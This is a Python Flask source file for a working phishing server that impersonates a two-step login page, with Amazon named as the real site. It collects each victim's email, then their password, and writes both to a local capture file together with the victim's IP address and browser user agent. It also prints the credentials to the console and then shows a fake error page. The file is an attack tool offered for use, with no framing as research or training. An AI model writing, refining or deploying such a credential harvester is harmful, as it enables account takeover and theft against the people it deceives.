import os
import datetime
from flask import Flask, request, redirect, render_template, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)  # Required for session

LOG_FILE = 'captured_data.txt'
REAL_SITE_URL = 'https://www.amazon.com'

# Store email temporarily in memory as backup (in case sessions fail)
temp_email_store = {}

def log_capture_data(email, password, ip, user_agent):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"""
{'='*60}
CAPTURE EVENT: {timestamp}
{'='*60}
TARGET_IP: {ip}
USER_AGENT: {user_agent}
EMAIL_INPUT: {email}
PASSWORD_INPUT: {password}
{'='*60}
END OF LOG ENTRY\n\n"""
        
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        print(f"[LOG] Data captured: Email={email}, Password={password}")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to write log: {e}")
        return False

def get_real_ip():
    if request.environ.get('HTTP_X_REAL_IP'):
        return request.environ.get('HTTP_X_REAL_IP')
    elif request.environ.get('HTTP_X_FORWARDED_FOR'):
        return request.environ.get('HTTP_X_FORWARDED_FOR').split(',')[0]
    else:
        return request.remote_addr

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        
        # Step 1: Email submitted
        if password == '' and email != '':
            # Save email in session (primary method)
            session['user_email'] = email
            # Also save in temp store as backup (in case sessions fail)
            temp_email_store['pending_email'] = email
            print(f"[DEBUG] Email stored in session and temp: {email}")
            return render_template('index.html', 
                                   email_value=email, 
                                   show_password=True)
        
        # Step 2: Password submitted
        if password != '':
            # Try to get email from session first
            stored_email = session.get('user_email', '')
            
            # If session failed, try temp store
            if not stored_email and 'pending_email' in temp_email_store:
                stored_email = temp_email_store['pending_email']
                print(f"[DEBUG] Retrieved email from temp store: {stored_email}")
            elif not stored_email:
                # Last resort: use whatever was submitted in the form (might be empty)
                stored_email = email
                print(f"[WARNING] No stored email found. Using submitted value: '{stored_email}'")
            
            user_ip = get_real_ip()
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            # Log the credentials
            log_capture_data(stored_email, password, user_ip, user_agent)
            
            # Clear session and temp store
            session.pop('user_email', None)
            temp_email_store.pop('pending_email', None)
            
            # Redirect to error page
            return redirect('/error')

    # Default: Show email form
    email_value = ''
    if 'user_email' in session:
        email_value = session['user_email']
    elif 'pending_email' in temp_email_store:
        email_value = temp_email_store['pending_email']
    
    return render_template('index.html', 
                           email_value=email_value, 
                           show_password=False)

@app.route('/error')
def error():
    return render_template('error.html')

@app.errorhandler(404)
def page_not_found(e):
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)